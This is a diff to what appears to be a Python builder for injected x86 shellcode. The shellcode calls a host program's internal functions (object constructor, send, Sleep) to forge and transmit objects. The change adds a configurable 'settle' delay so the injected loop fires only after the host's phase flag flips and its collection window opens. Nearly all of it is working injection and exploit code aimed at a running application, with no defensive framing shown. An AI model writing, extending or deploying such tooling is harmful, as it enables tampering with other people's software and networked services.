@@ -73,7 +73,7 @@ BLOB_LAYOUT = (
     ('is_connected', 0x20), ('get_ip', 0x24), ('core_global', 0x28),
     ('ctor', 0x2C), ('send', 0x30), ('send_this', 0x34),
     ('obj_size', 0x38), ('nfields', 0x3C), ('table_off', 0x40), ('class_tag', 0x44),
-    ('phase_req', 0x148),
+    ('phase_req', 0x148), ('phase_settle', 0x14C),
 )
 POINTER_NAMES = tuple(name for name, _ in BLOB_LAYOUT[2:11])
 
@@ -109,6 +109,14 @@ g_loop:
     mov eax, [esi+0x148]            ; phase gate (0 = any)
     test eax, eax
     jz g_phase_ok
+    movzx ecx, word ptr [ebx+0x4d8]
+    cmp ecx, eax
+    jne g_sleep_short
+    mov edx, [esi+0x14C]            ; settle ms: the host's collection window opens
+    test edx, edx                   ; a moment AFTER the phase flag flips
+    jz g_phase_ok
+    push edx
+    call dword ptr [esi+0x18]       ; Sleep(settle)
     movzx ecx, word ptr [ebx+0x4d8]
     cmp ecx, eax
     jne g_sleep_short
@@ -272,7 +280,7 @@ PRESETS = {
 
 
 def build_blob(pointers, *, cls, fields, sanpk_base, flag_path, receipt_path, class_tag=0,
-               phase_req=0):
+               phase_req=0, phase_settle=3000):
     if cls not in CLASSES:
         raise ValueError('unknown class: ' + cls)
     ctor_va, size, kind, _vtable = CLASSES[cls]
@@ -303,6 +311,7 @@ def build_blob(pointers, *, cls, fields, sanpk_base, flag_path, receipt_path, cl
     put32(0x40, TABLE_OFF)
     put32(0x44, class_tag if class_tag else kind)
     put32(0x148, phase_req)
+    put32(0x14C, phase_settle)
     put_path(FLAG_OFF, flag_path)
     put_path(RECEIPT_OFF, receipt_path)
     for i, (off, val) in enumerate(fields):
